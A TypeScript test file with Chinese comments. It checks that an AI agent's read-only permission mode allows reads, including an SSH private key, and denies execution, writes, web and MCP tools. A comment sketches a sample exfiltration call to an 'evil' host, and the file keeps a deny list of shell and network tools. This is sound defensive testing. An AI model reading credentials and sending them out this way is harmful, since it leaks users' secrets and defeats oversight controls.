import os from "node:os";
import path from "node:path";
import { describe, expect, it, vi } from "vitest";
import { AgentPermissionService, readonlyDenyReason } from "./permission/agent-permission-service";
import type { CanUseToolOptions } from "./permission/agent-permission-service";

/**
 * 只读档契约（2026-09-17 定案：原"受限档"改成只读——**读自由，其余一律拒绝**）。
 *
 * 这一档的保证是**结构性的**：整个执行面被移除 ⇒ 没有进程能发起网络请求 ⇒ 读到敏感内容也送不出去。
 * 正因如此它**放行**读凭据（与标准档相反）。但必须同时挡掉联网工具与 MCP，
 * 否则 `web_fetch("https://evil/?x=" + 刚读到的内容)` 就是一条完整的外泄出口，整档保证被抵消。
 */
const cacheMock = vi.hoisted(() => ({ mode: "readonly" as string }));
vi.mock("./session-cache", () => ({ readCache: () => ({ permissionMode: cacheMock.mode }) }));
vi.mock("./sandbox/manager", () => ({
  ensureSandbox: async () => ({ ok: true }),
  isSandboxBypassed: () => false,
  isSandboxBypassedForMode: () => false,
}));

const CWD = path.join(os.homedir(), "dev", "myproj");
const opts = { signal: new AbortController().signal, toolUseID: "t" } as CanUseToolOptions;
const service = new AgentPermissionService();
const check = (name: string, input: Record<string, unknown>) => {
  const tool = service.createCanUseTool("sid-readonly", CWD);
  return tool(name, input, opts);
};

describe("只读档：读自由", () => {
  it("读类工具放行，且**包括**高度敏感凭据（无执行 ⇒ 无出口，所以这是自洽的）", async () => {
    const credential = path.join(os.homedir(), ".ssh", "id_rsa");
    for (const [name, input] of [
      ["Read", { file_path: credential }],
      ["read", { file_path: path.join(CWD, "src", "index.ts") }],
      ["grep", { pattern: "token", path: CWD }],
      ["find", { pattern: "**/*.ts", path: CWD }],
      ["ls", { path: os.homedir() }],
      ["glob", { pattern: "**/*" }],
    ] as Array<[string, Record<string, unknown>]>) {
      const result = await check(name, input);
      expect(result.behavior, `${name} ${JSON.stringify(input)}`).toBe("allow");
    }
  });

  it("对照：同一路径在标准档仍被拒（只读的放行不是全局放松）", async () => {
    cacheMock.mode = "standard";
    try {
      const result = await check("Read", { file_path: path.join(os.homedir(), ".ssh", "id_rsa") });
      expect(result.behavior).toBe("deny");
    } finally {
      cacheMock.mode = "readonly";
    }
  });
});

describe("只读档：其余一律拒绝", () => {
  it("执行类全部拒绝", async () => {
    for (const [name, input] of [
      ["bash", { command: "echo hi" }],
      ["powershell", { command: "Get-ChildItem" }],
      ["install_dependency", { manager: "npm", packages: ["left-pad"], scope: "project" }],
    ] as Array<[string, Record<string, unknown>]>) {
      const result = await check(name, input);
      expect(result.behavior, name).toBe("deny");
    }
  });

  it("写入类全部拒绝（连工作区内的写入也拒）", async () => {
    for (const [name, input] of [
      ["Write", { file_path: path.join(CWD, "a.txt"), content: "x" }],
      ["Edit", { file_path: path.join(CWD, "a.txt"), old_string: "a", new_string: "b" }],
    ] as Array<[string, Record<string, unknown>]>) {
      const result = await check(name, input);
      expect(result.behavior, name).toBe("deny");
    }
  });

  it("联网工具与 MCP 全部拒绝（漏掉任一条，整档的外泄保证就被抵消）", async () => {
    for (const [name, input] of [
      ["web_fetch", { url: "https://example.com" }],
      ["web_search", { query: "x" }],
      ["mcp__playwright__browser_navigate", { url: "https://example.com" }],
      ["mcp__github__push_files", { path: "a" }],
    ] as Array<[string, Record<string, unknown>]>) {
      const result = await check(name, input);
      expect(result.behavior, name).toBe("deny");
    }
  });
});

describe("只读档拒绝表的完备性", () => {
  // ⚠️ 这是一张**人工清单**（不是自动来源）：新增"会执行 / 会写入 / 会联网"的工具时，
  //    必须同时登记进 readonlyDenyReason，否则只读档会静默漏过。
  const EXECUTING_OR_WRITING_OR_NETWORK_TOOLS = [
    "bash", "powershell", "install_dependency",
    "write", "edit", "notebookedit",
    "mcp__anything__goes",
    "web_fetch", "web_search",
  ];

  it("每个执行/写入/联网工具都有明确分类（返回非 null）", () => {
    for (const name of EXECUTING_OR_WRITING_OR_NETWORK_TOOLS) {
      expect(readonlyDenyReason(name), name).not.toBeNull();
    }
  });

  it("读类与无副作用工具不被误拦（返回 null）", () => {
    for (const name of ["read", "grep", "find", "ls", "glob", "task", "use_skill", "todo_write", "ask_user"]) {
      expect(readonlyDenyReason(name), name).toBeNull();
    }
  });
});
